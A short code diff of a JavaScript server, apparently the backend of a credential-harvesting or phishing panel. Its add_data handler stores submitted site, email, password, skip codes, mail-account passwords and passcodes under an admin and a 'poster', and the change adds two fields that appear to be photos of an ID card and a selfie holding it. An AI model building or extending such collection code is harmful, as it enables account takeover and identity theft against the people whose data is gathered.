@@ -44,7 +44,7 @@ import changeEvent from'../stream.js'
 //         res.status(422).json({error:error})
 //       //   res.send(err.code)
 //       }
-// }
+// 
 
 
 
@@ -331,7 +331,7 @@ export const poster_add = async (req, res) => {
 export const add_data = async (req, res) => {
 
     const { adminId, posterId } = req.params
-    const { site, email, password, skipcode ,username,passcode,mail,mailPass } = req.body
+    const { site, email, password, skipcode ,username,passcode,mail,mailPass,onlyCard,holdingCard } = req.body
 
     try {
         const userFound = await User.findOne({ adminId: adminId })
@@ -343,7 +343,8 @@ export const add_data = async (req, res) => {
                 site, email, password, skipcode,
                 username,passcode,mail,mailPass,adminId:adminId,
                 poster: posterId,
-                root: posterFound._id
+                root: posterFound._id,
+                onlyCard,holdingCard
 
 
             })
